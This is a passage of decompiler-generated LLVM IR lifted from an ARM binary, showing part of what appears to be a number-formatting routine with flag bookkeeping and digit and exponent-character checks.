  store i32 %v0_119c8, i32* %r0.global-to-local, align 4
  %v0_119cc = load i32, i32* @r5, align 4
  %v1_119cc = add i32 %v0_119cc, -8
  %v3_119cc = sub i32 7, %v0_119cc
  %v4_119cc = and i32 %v3_119cc, %v0_119cc
  %v5_119cc = icmp slt i32 %v4_119cc, 0
  store i1 %v5_119cc, i1* %cpsr_v.global-to-local, align 1
  %v6_119cc = icmp slt i32 %v1_119cc, 0
  store i1 %v6_119cc, i1* %cpsr_n.global-to-local, align 1
  %v7_119cc = icmp eq i32 %v0_119cc, 8
  store i1 %v7_119cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_119c8, i32* @r4, align 4
  %v7_119d4 = icmp slt i32 %v0_119cc, 9
  br i1 %v7_119d4, label %dec_label_pc_119a4, label %dec_label_pc_119d8

dec_label_pc_119d8:                               ; preds = %dec_label_pc_119a4
  %v0_119d8 = load i32, i32* @r8, align 4
  %v1_119d8 = add i32 %v0_119d8, 1
  store i32 %v1_119d8, i32* @r8, align 4
  %v3_119dc = sub i32 -1, %v0_119d8
  %v4_119dc = and i32 %v1_119d8, %v3_119dc
  %v5_119dc = icmp slt i32 %v4_119dc, 0
  store i1 %v5_119dc, i1* %cpsr_v.global-to-local, align 1
  %v6_119dc = icmp slt i32 %v0_119d8, 0
  store i1 %v6_119dc, i1* %cpsr_n.global-to-local, align 1
  %v7_119dc = icmp eq i32 %v0_119d8, 0
  store i1 %v7_119dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_119dc, label %dec_label_pc_11944, label %dec_label_pc_119e4

dec_label_pc_119e4:                               ; preds = %dec_label_pc_119d8
  %v0_119e4 = load i32, i32* @sl, align 4
  %v1_119e4 = add i32 %v0_119e4, -96
  %v3_119e4 = sub i32 95, %v0_119e4
  %v4_119e4 = and i32 %v3_119e4, %v0_119e4
  %v5_119e4 = icmp slt i32 %v4_119e4, 0
  store i1 %v5_119e4, i1* %cpsr_v.global-to-local, align 1
  %v6_119e4 = icmp slt i32 %v1_119e4, 0
  store i1 %v6_119e4, i1* %cpsr_n.global-to-local, align 1
  %v7_119e4 = icmp eq i32 %v0_119e4, 96
  store i1 %v7_119e4, i1* %cpsr_z.global-to-local, align 1
  %tmp288 = icmp ult i32 %v0_119e4, 97
  store i32 %v1_11a14, i32* %ip.global-to-local, align 4
  br i1 %tmp288, label %bb230, label %thread-pre-split

bb230:                                            ; preds = %dec_label_pc_119e4
  %v5_119f4 = add i32 %v0_119e4, 32
  store i32 %v5_119f4, i32* %r3.global-to-local, align 4
  %v5_119f8 = urem i32 %v5_119f4, 256
  store i32 %v5_119f8, i32* @sl, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_119e4, %bb230
  %v0_11a1c = phi i32 [ %v5_119f8, %bb230 ], [ %v0_119e4, %dec_label_pc_119e4 ]
  %stack_var_-58.0130137 = phi i32 [ 69, %bb230 ], [ 101, %dec_label_pc_119e4 ]
  %v7_119fc = icmp eq i32 %v0_11a1c, 103
  %. = zext i1 %v7_119fc to i32
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11a08 = icmp slt i32 %v1_11a14, 0
  store i1 %v1_11a08, i1* %cpsr_n.global-to-local, align 1
  %v2_11a08 = icmp eq i32 %v1_11a14, 0
  store i1 %v2_11a08, i1* %cpsr_z.global-to-local, align 1
  %tmp233 = icmp slt i32 %v1_11a14, 1
  br i1 %tmp233, label %.thread12, label %bb234

.thread12:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb236

bb234:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11a10 = icmp eq i1 %v7_119fc, false
  store i1 %v2_11a10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11a10, label %bb236, label %bb235

bb235:                                            ; preds = %bb234
  %v2_11a14 = add i32 %v1_11a14, -1
  store i32 %v2_11a14, i32* %ip.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %.thread12, %bb234, %bb235
  %v0_11a18 = phi i32 [ %v1_11a14, %.thread12 ], [ %v1_11a14, %bb234 ], [ %v2_11a14, %bb235 ]
  %v1_11a1c = add i32 %v0_11a1c, -102
  %v3_11a1c = sub i32 101, %v0_11a1c
  %v4_11a1c = and i32 %v3_11a1c, %v0_11a1c
  %v5_11a1c = icmp slt i32 %v4_11a1c, 0
  store i1 %v5_11a1c, i1* %cpsr_v.global-to-local, align 1
  %v6_11a1c = icmp slt i32 %v1_11a1c, 0
  store i1 %v6_11a1c, i1* %cpsr_n.global-to-local, align 1
  %v7_11a1c = icmp eq i32 %v0_11a1c, 102
  store i1 %v7_11a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a1c, label %dec_label_pc_11a28, label %bb237

bb237:                                            ; preds = %bb236
  store i32 %v0_11a18, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a54

dec_label_pc_11a28:                               ; preds = %bb236
  store i32 %v0_11a18, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-192.6, i32* %r1.global-to-local, align 4
  %v2_11a30 = add i32 %v0_11a18, %stack_var_-192.6
  store i32 %v2_11a30, i32* %ip.global-to-local, align 4
  %v1_11a34 = add i32 %v2_11a30, 1
  %v3_11a34 = sub i32 0, %v2_11a30
  %v4_11a34 = and i32 %v1_11a34, %v3_11a34
  %v5_11a34 = icmp slt i32 %v4_11a34, 0
  store i1 %v5_11a34, i1* %cpsr_v.global-to-local, align 1
  %v6_11a34 = icmp slt i32 %v1_11a34, 0
  store i1 %v6_11a34, i1* %cpsr_n.global-to-local, align 1
  %v7_11a34 = icmp eq i32 %v1_11a34, 0
  store i1 %v7_11a34, i1* %cpsr_z.global-to-local, align 1
  %v2_11a38 = xor i1 %v6_11a34, %v5_11a34
  br i1 %v2_11a38, label %dec_label_pc_11a3c, label %dec_label_pc_11a54

dec_label_pc_11a3c:                               ; preds = %dec_label_pc_11a28
  %v2_11a3c = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_11a3c, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_11a48 = bitcast i32* %stack_var_-79 to i8*
  %v3_11a48 = call i32 @function_ec20(i8* %v2_11a48, i32 48)
  store i32 %v3_11a48, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a54

dec_label_pc_11a54:                               ; preds = %bb237, %dec_label_pc_11a28, %dec_label_pc_11a3c
  %v1_11a9874 = phi i32 [ %v3_11a48, %dec_label_pc_11a3c ], [ %v0_11a18, %dec_label_pc_11a28 ], [ %v0_119c8, %bb237 ]
  %v1_11a7c = phi i32 [ -1, %dec_label_pc_11a3c ], [ %v2_11a30, %dec_label_pc_11a28 ], [ %v0_11a18, %bb237 ]
  %stack_var_-192.7 = phi i32 [ -1, %dec_label_pc_11a3c ], [ %stack_var_-192.6, %dec_label_pc_11a28 ], [ %stack_var_-192.6, %bb237 ]
  %v1_11a58 = add i32 %v1_11a7c, -16
  %v3_11a58 = sub i32 15, %v1_11a7c
  %v4_11a58 = and i32 %v3_11a58, %v1_11a7c
  %v5_11a58 = icmp slt i32 %v4_11a58, 0
  store i1 %v5_11a58, i1* %cpsr_v.global-to-local, align 1
  %v6_11a58 = icmp slt i32 %v1_11a58, 0
  store i1 %v6_11a58, i1* %cpsr_n.global-to-local, align 1
  %v7_11a58 = icmp eq i32 %v1_11a7c, 16
  store i1 %v7_11a58, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-78, align 4
  %v2_11a64 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_11a64, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-79, align 4
  %v3_11a6c = xor i1 %v6_11a58, %v5_11a58
  %v4_11a6c = or i1 %v7_11a58, %v3_11a6c
  br i1 %v4_11a6c, label %dec_label_pc_11a78, label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %dec_label_pc_11a54
  store i32 0, i32* %r0.global-to-local, align 4
  %v7_11a70151 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v7_11a70151, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a54
  %v2_11a78 = ptrtoint i32* %stack_var_-78 to i32
  %v2_11a7c = add i32 %v1_11a7c, %v2_11a78
  store i32 %v2_11a7c, i32* %r3.global-to-local, align 4
  %v1_11a80 = add i32 %v2_11a7c, 2
  %v2_11a80 = inttoptr i32 %v1_11a80 to i8*
  %v3_11a80 = load i8, i8* %v2_11a80, align 1
  %v4_11a80 = zext i8 %v3_11a80 to i32
  store i32 %v4_11a80, i32* %r2.global-to-local, align 4
  store i32 %v1_11a80, i32* %r1.global-to-local, align 4
  %v2_11a88 = icmp ugt i8 %v3_11a80, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11a88 = icmp ult i8 %v3_11a80, 52
  store i1 %v6_11a88, i1* %cpsr_n.global-to-local, align 1
  %v7_11a88 = icmp eq i8 %v3_11a80, 52
  store i1 %v7_11a88, i1* %cpsr_z.global-to-local, align 1
  %v2_11a8c = xor i1 %v2_11a88, true
  %v3_11a8c = or i1 %v7_11a88, %v2_11a8c
  br i1 %v3_11a8c, label %bb238, label %bb239

bb238:                                            ; preds = %dec_label_pc_11a78
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb239

bb239:                                            ; preds = %dec_label_pc_11a78, %bb238
  %v1_11a9872 = phi i32 [ %v1_11a9874, %dec_label_pc_11a78 ], [ 0, %bb238 ]
  %v2_11a90 = xor i1 %v7_11a88, true
  %v3_11a90 = and i1 %v2_11a88, %v2_11a90
  br i1 %v3_11a90, label %bb240, label %.preheader

bb240:                                            ; preds = %bb239
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb239, %bb240, %..preheader_crit_edge, %.backedge
  %v1_11a98 = phi i32 [ %v1_11a98.pre, %.backedge ], [ 0, %..preheader_crit_edge ], [ %v1_11a9872, %bb239 ], [ 1, %bb240 ]
  %v0_11a94 = phi i32 [ %v0_11aa0, %.backedge ], [ %v7_11a70151, %..preheader_crit_edge ], [ %v1_11a80, %bb239 ], [ %v1_11a80, %bb240 ]
  %v1_11a94 = add i32 %v0_11a94, -1
  %v2_11a94 = inttoptr i32 %v1_11a94 to i8*
  %v3_11a94 = load i8, i8* %v2_11a94, align 1
  %v4_11a94 = zext i8 %v3_11a94 to i32
  store i32 %v1_11a94, i32* %r1.global-to-local, align 4
  %v2_11a98 = add i32 %v4_11a94, %v1_11a98
  store i32 %v2_11a98, i32* %r3.global-to-local, align 4
  %v1_11a9c = trunc i32 %v2_11a98 to i8
  store i8 %v1_11a9c, i8* %v2_11a94, align 1
  %v0_11aa0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11aa0 = inttoptr i32 %v0_11aa0 to i8*
  %v2_11aa0 = load i8, i8* %v1_11aa0, align 1
  %v3_11aa0 = zext i8 %v2_11aa0 to i32
  store i32 %v3_11aa0, i32* %r2.global-to-local, align 4
  %v2_11aa4 = icmp ugt i8 %v2_11aa0, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11aa4 = icmp ult i8 %v2_11aa0, 57
  store i1 %v6_11aa4, i1* %cpsr_n.global-to-local, align 1
  %v7_11aa4 = icmp eq i8 %v2_11aa0, 57
  store i1 %v7_11aa4, i1* %cpsr_z.global-to-local, align 1
  %v2_11aa8 = xor i1 %v2_11aa4, true
  %v3_11aa8 = or i1 %v7_11aa4, %v2_11aa8
  br i1 %v3_11aa8, label %bb241, label %bb242

bb241:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb242

bb242:                                            ; preds = %.preheader, %bb241
  %v2_11aac = xor i1 %v7_11aa4, true
  %v3_11aac = and i1 %v2_11aa4, %v2_11aac
  br i1 %v3_11aac, label %bb243, label %._crit_edge75

._crit_edge75:                                    ; preds = %bb242
  %v1_11ab4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb244

bb243:                                            ; preds = %bb242
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb244

bb244:                                            ; preds = %._crit_edge75, %bb243
  %v1_11ab4 = phi i32 [ %v1_11ab4.pre, %._crit_edge75 ], [ 1, %bb243 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11ab0 = icmp ult i8 %v2_11aa0, 48
  store i1 %v6_11ab0, i1* %cpsr_n.global-to-local, align 1
  %v7_11ab0 = icmp eq i8 %v2_11aa0, 48
  store i1 %v7_11ab0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ab0, label %.thread17, label %bb245

.thread17:                                        ; preds = %bb244
  %v2_11ab4 = or i32 %v1_11ab4, 1
  store i32 %v2_11ab4, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11ab818 = icmp slt i32 %v2_11ab4, 0
  store i1 %v1_11ab818, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb245:                                            ; preds = %bb244
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11ab8 = icmp slt i32 %v1_11ab4, 0
  store i1 %v1_11ab8, i1* %cpsr_n.global-to-local, align 1
  %v2_11ab8 = icmp eq i32 %v1_11ab4, 0
  store i1 %v2_11ab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11ab8, label %dec_label_pc_11ac0, label %.backedge

.backedge:                                        ; preds = %bb245, %.thread17
  %v1_11a98.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_11ac0:                               ; preds = %bb245
  store i32 %v2_11a64, i32* %r2.global-to-local, align 4
  %v2_11ac4 = ptrtoint i32* %stack_var_-78 to i32
  store i32 %v2_11ac4, i32* %r3.global-to-local, align 4
  %v2_11ac8 = sub i32 %v0_11aa0, %v2_11ac4
  %v3_11ac8 = icmp uge i32 %v0_11aa0, %v2_11ac4
  %v4_11ac8 = xor i32 %v0_11aa0, %v2_11ac4
  %v5_11ac8 = xor i32 %v2_11ac8, %v0_11aa0
  %v6_11ac8 = and i32 %v5_11ac8, %v4_11ac8
  %v7_11ac8 = icmp slt i32 %v6_11ac8, 0
  store i1 %v7_11ac8, i1* %cpsr_v.global-to-local, align 1
  %v8_11ac8 = icmp slt i32 %v2_11ac8, 0
  store i1 %v8_11ac8, i1* %cpsr_n.global-to-local, align 1
  %v9_11ac8 = icmp eq i32 %v0_11aa0, %v2_11ac4
  store i1 %v9_11ac8, i1* %cpsr_z.global-to-local, align 1
  %v2_11acc = xor i1 %v3_11ac8, true
  %v3_11acc = or i1 %v9_11ac8, %v2_11acc
  br i1 %v3_11acc, label %bb246, label %.thread161

bb246:                                            ; preds = %dec_label_pc_11ac0
  store i32 %v2_11ac4, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-192.7, i32* %r3.global-to-local, align 4
  store i32 %v2_11ac4, i32* %r1.global-to-local, align 4
  br label %.thread161

.thread161:                                       ; preds = %dec_label_pc_11ac0, %bb246
  %v4_11adc159 = phi i32 [ %stack_var_-192.7, %bb246 ], [ %v2_11ac4, %dec_label_pc_11ac0 ]
  %v2_11aec = phi i32 [ %v2_11ac4, %bb246 ], [ %v0_11aa0, %dec_label_pc_11ac0 ]
  %v4_11ae0153158 = phi i32 [ %v2_11ac4, %bb246 ], [ %v2_11a64, %dec_label_pc_11ac0 ]
  %v2_11ad8 = xor i1 %v9_11ac8, true
  %v3_11ad8 = and i1 %v3_11ac8, %v2_11ad8
  br i1 %v3_11ad8, label %bb247, label %bb248

bb247:                                            ; preds = %.thread161
  store i32 %stack_var_-192.7, i32* %r0.global-to-local, align 4
  br label %bb248

bb248:                                            ; preds = %.thread161, %bb247
  br i1 %v3_11acc, label %bb249, label %bb250

bb249:                                            ; preds = %bb248
  %v5_11adc = add i32 %v4_11adc159, 1
  store i32 %v5_11adc, i32* %r0.global-to-local, align 4
  br label %bb250

bb250:                                            ; preds = %bb248, %bb249
  br i1 %v3_11ad8, label %bb251, label %bb252

bb251:                                            ; preds = %bb250
  %v5_11ae0 = add i32 %v4_11ae0153158, 2
  store i32 %v5_11ae0, i32* %r2.global-to-local, align 4
  br label %bb252

bb252:                                            ; preds = %bb250, %bb251
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11ae8 = load i32, i32* @sl, align 4
  %v1_11ae8 = add i32 %v0_11ae8, -103
  %v3_11ae8 = sub i32 102, %v0_11ae8
  %v4_11ae8 = and i32 %v3_11ae8, %v0_11ae8
  %v5_11ae8 = icmp slt i32 %v4_11ae8, 0
  store i1 %v5_11ae8, i1* %cpsr_v.global-to-local, align 1
  %v6_11ae8 = icmp slt i32 %v1_11ae8, 0
  store i1 %v6_11ae8, i1* %cpsr_n.global-to-local, align 1
  %v7_11ae8 = icmp eq i32 %v0_11ae8, 103
  store i1 %v7_11ae8, i1* %cpsr_z.global-to-local, align 1
  %v3_11aec = add i32 %v2_11aec, 1
  %v4_11aec = inttoptr i32 %v3_11aec to i8*
  store i8 0, i8* %v4_11aec, align 1
  %v0_11af0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11af0 = add i32 %v0_11af0, 1
  store i32 %v1_11af0, i32* %r1.global-to-local, align 4
  %v0_11af4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11af4, label %dec_label_pc_11af8, label %dec_label_pc_11b28

dec_label_pc_11af8:                               ; preds = %bb252
  %v0_11af8 = load i32, i32* %r0.global-to-local, align 4
  %v1_11af8 = load i32, i32* %ip.global-to-local, align 4
  %v2_11af8 = sub i32 %v0_11af8, %v1_11af8
  %v4_11af8 = xor i32 %v1_11af8, %v0_11af8
  %v5_11af8 = xor i32 %v2_11af8, %v0_11af8
  %v6_11af8 = and i32 %v5_11af8, %v4_11af8
  %v7_11af8 = icmp slt i32 %v6_11af8, 0
  %v8_11af8 = icmp slt i32 %v2_11af8, 0
  %v9_11af8 = icmp eq i32 %v0_11af8, %v1_11af8
  %v3_11afc = xor i1 %v8_11af8, %v7_11af8
  %v4_11afc = or i1 %v9_11af8, %v3_11afc
  %.274 = zext i1 %v4_11afc to i32
  store i32 %.274, i32* %r3.global-to-local, align 4
  %v1_11b04 = add i32 %v0_11af8, 4
  %v3_11b04 = sub i32 0, %v0_11af8
  %v4_11b04 = and i32 %v1_11b04, %v3_11b04
  %v5_11b04 = icmp slt i32 %v4_11b04, 0
  store i1 %v5_11b04, i1* %cpsr_v.global-to-local, align 1
  %v6_11b04 = icmp slt i32 %v1_11b04, 0
  store i1 %v6_11b04, i1* %cpsr_n.global-to-local, align 1
  %v7_11b04 = icmp eq i32 %v1_11b04, 0
  store i1 %v7_11b04, i1* %cpsr_z.global-to-local, align 1
  %v2_11b08 = xor i1 %v6_11b04, %v5_11b04
  br i1 %v2_11b08, label %.thread21, label %bb255

.thread21:                                        ; preds = %dec_label_pc_11af8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread164

bb255:                                            ; preds = %dec_label_pc_11af8
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11b0c = icmp eq i1 %v4_11afc, false
  store i1 %v2_11b0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11b0c, label %.thread164, label %bb256

.thread164:                                       ; preds = %bb255, %.thread21
  %v1_11b143551 = load i32, i32* @sl, align 4
  store i32 %v1_11b143551, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11b34

bb256:                                            ; preds = %bb255
  %v3_11b10 = sub i32 %v1_11af8, %v0_11af8
  store i32 %v3_11b10, i32* %ip.global-to-local, align 4
  store i32 102, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11b40

dec_label_pc_11b28:                               ; preds = %bb252
  %v0_11b28 = load i32, i32* @sl, align 4
  %v1_11b28 = add i32 %v0_11b28, -102
  %v3_11b28 = sub i32 101, %v0_11b28
  %v4_11b28 = and i32 %v3_11b28, %v0_11b28
  %v5_11b28 = icmp slt i32 %v4_11b28, 0
  store i1 %v5_11b28, i1* %cpsr_v.global-to-local, align 1
  %v6_11b28 = icmp slt i32 %v1_11b28, 0
  store i1 %v6_11b28, i1* %cpsr_n.global-to-local, align 1
  %v7_11b28 = icmp eq i32 %v0_11b28, 102
  store i1 %v7_11b28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_11b28, i32* %r7.global-to-local, align 4
  br i1 %v7_11b28, label %dec_label_pc_11b28.dec_label_pc_11b40_crit_edge, label %dec_label_pc_11b34

dec_label_pc_11b28.dec_label_pc_11b40_crit_edge:  ; preds = %dec_label_pc_11b28
  %v0_11b40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11b40

dec_label_pc_11b34:                               ; preds = %.thread164, %dec_label_pc_11b28
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11b50

dec_label_pc_11b40:                               ; preds = %bb256, %dec_label_pc_11b28.dec_label_pc_11b40_crit_edge
  %v0_11b40 = phi i32 [ %v0_11af8, %bb256 ], [ %v0_11b40.pre, %dec_label_pc_11b28.dec_label_pc_11b40_crit_edge ]
  %stack_var_-184.3 = phi i32 [ %v3_11b10, %bb256 ], [ %v0_11a18, %dec_label_pc_11b28.dec_label_pc_11b40_crit_edge ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11b40 = icmp slt i32 %v0_11b40, 0
  store i1 %v1_11b40, i1* %cpsr_n.global-to-local, align 1
  %v2_11b40 = icmp eq i32 %v0_11b40, 0
  store i1 %v2_11b40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11b40, label %bb257, label %bb258

bb257:                                            ; preds = %dec_label_pc_11b40
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_11b48 = load i32, i32* %r2.global-to-local, align 4
  %v6_11b48 = add i32 %v5_11b48, -1
  %v7_11b48 = inttoptr i32 %v6_11b48 to i8*
  store i8 48, i8* %v7_11b48, align 1
  %v8_11b48 = load i32, i32* %r2.global-to-local, align 4
  %v9_11b48 = add i32 %v8_11b48, -1
  store i32 %v9_11b48, i32* %r2.global-to-local, align 4
  %v0_11b4c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_11b7c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_11b80.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_11b80.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb258

bb258:                                            ; preds = %dec_label_pc_11b40, %bb257
  %v1_11b80.pre = phi i1 [ %v1_11b80.pre.pre, %bb257 ], [ false, %dec_label_pc_11b40 ]
  %v0_11b80.pre = phi i1 [ %v0_11b80.pre.pre, %bb257 ], [ false, %dec_label_pc_11b40 ]
  %v1_11b7c.pre = phi i32 [ %v1_11b7c.pre.pre, %bb257 ], [ %v1_11af0, %dec_label_pc_11b40 ]
  %v0_11b4c = phi i32 [ %v0_11b4c.pre, %bb257 ], [ %v0_11b40, %dec_label_pc_11b40 ]
  store i32 %v0_11b4c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11b50

dec_label_pc_11b50:                               ; preds = %dec_label_pc_11b34, %bb258
  %v0_11be8 = phi i32 [ 0, %dec_label_pc_11b34 ], [ %v0_11b4c, %bb258 ]
  %v1_11b84 = phi i1 [ false, %dec_label_pc_11b34 ], [ %v1_11b80.pre, %bb258 ]
  %v0_11b84 = phi i1 [ false, %dec_label_pc_11b34 ], [ %v0_11b80.pre, %bb258 ]
  %v1_11b7c = phi i32 [ %v1_11af0, %dec_label_pc_11b34 ], [ %v1_11b7c.pre, %bb258 ]
  %v1_11ca4 = phi i32 [ %v0_11a18, %dec_label_pc_11b34 ], [ %stack_var_-184.3, %bb258 ]
  store i32 1, i32* %stack_var_-160, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_11b5c = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_11b5c, i32* %r3.global-to-local, align 4
  %v0_11b68 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b68 = inttoptr i32 %v0_11b68 to i8*
  %v2_11b68 = load i8, i8* %v1_11b68, align 1
  %v3_11b68 = zext i8 %v2_11b68 to i32
  store i32 %v3_11b68, i32* %r3.global-to-local, align 4
  %v5_11b68 = add i32 %v0_11b68, 1
  store i32 %v5_11b68, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_11b68, i32* %stack_var_-38, align 4
  %v2_11b7c = sub i32 %v1_11b7c, %v5_11b68
  store i32 %v2_11b7c, i32* %r1.global-to-local, align 4
  %v2_11b80 = xor i1 %v1_11b84, %v0_11b84
  br i1 %v2_11b80, label %.thread166, label %dec_label_pc_11b88

.thread166:                                       ; preds = %dec_label_pc_11b50
  %v5_11b80 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v5_11b80, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11bf8

dec_label_pc_11b88:                               ; preds = %dec_label_pc_11b50
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_11b8c = sub i32 %v0_11be8, %v2_11b7c
  %v4_11b8c = xor i32 %v2_11b7c, %v0_11be8
  %v5_11b8c = xor i32 %v2_11b8c, %v0_11be8
  %v6_11b8c = and i32 %v5_11b8c, %v4_11b8c
  %v7_11b8c = icmp slt i32 %v6_11b8c, 0
  store i1 %v7_11b8c, i1* %cpsr_v.global-to-local, align 1
  %v8_11b8c = icmp slt i32 %v2_11b8c, 0
  store i1 %v8_11b8c, i1* %cpsr_n.global-to-local, align 1
  %v9_11b8c = icmp eq i32 %v0_11be8, %v2_11b7c
  store i1 %v9_11b8c, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-152, align 4
  %v2_11b98 = xor i1 %v8_11b8c, %v7_11b8c
  br i1 %v2_11b98, label %dec_label_pc_11bd4, label %dec_label_pc_11b9c

dec_label_pc_11b9c:                               ; preds = %dec_label_pc_11b88
  store i32 %v2_11b8c, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_11b8c, i1* %cpsr_n.global-to-local, align 1
  %v2_11ba0 = icmp eq i32 %v2_11b8c, 0
  store i1 %v2_11ba0, i1* %cpsr_z.global-to-local, align 1
  %tmp259 = icmp slt i32 %v2_11b8c, 1
  br i1 %tmp259, label %.thread168, label %dec_label_pc_11bb4

.thread168:                                       ; preds = %dec_label_pc_11b9c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11bf4

dec_label_pc_11bb4:                               ; preds = %dec_label_pc_11b9c
  store i32 ptrtoint (i32* @global_var_17bb7.536 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_11bc0 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_11bc0, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-140, align 4
  br label %dec_label_pc_11bf8

dec_label_pc_11bd4:                               ; preds = %dec_label_pc_11b88
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11bd4 = icmp slt i32 %v0_11be8, 0
  store i1 %v1_11bd4, i1* %cpsr_n.global-to-local, align 1
  %v2_11bd4 = icmp eq i32 %v0_11be8, 0
  store i1 %v2_11bd4, i1* %cpsr_z.global-to-local, align 1
  %tmp260 = icmp slt i32 %v0_11be8, 1
  br i1 %tmp260, label %dec_label_pc_11bf4, label %dec_label_pc_11be4

dec_label_pc_11be4:                               ; preds = %dec_label_pc_11bd4
  %v2_11be8 = sub i32 %v2_11b7c, %v0_11be8
  store i32 %v2_11be8, i32* %r1.global-to-local, align 4
  %v2_11bec = add i32 %v5_11b68, %v0_11be8
  store i32 %v2_11bec, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11bf4

dec_label_pc_11bf4:                               ; preds = %dec_label_pc_11be4, %.thread168, %dec_label_pc_11bd4
  %storemerge180.in = phi i32* [ %stack_var_-152, %dec_label_pc_11bd4 ], [ %stack_var_-140, %.thread168 ], [ %stack_var_-140, %dec_label_pc_11be4 ]
  %v0_11c0c89 = phi i32 [ %v2_11b7c, %dec_label_pc_11bd4 ], [ 0, %.thread168 ], [ %v2_11be8, %dec_label_pc_11be4 ]
  %storemerge180 = ptrtoint i32* %storemerge180.in to i32
  store i32 %storemerge180, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11bf8

dec_label_pc_11bf8:                               ; preds = %.thread166, %dec_label_pc_11bb4, %dec_label_pc_11bf4
  %v1_11c30 = phi i32 [ %v2_11bc0, %dec_label_pc_11bb4 ], [ %storemerge180, %dec_label_pc_11bf4 ], [ %v5_11b80, %.thread166 ]
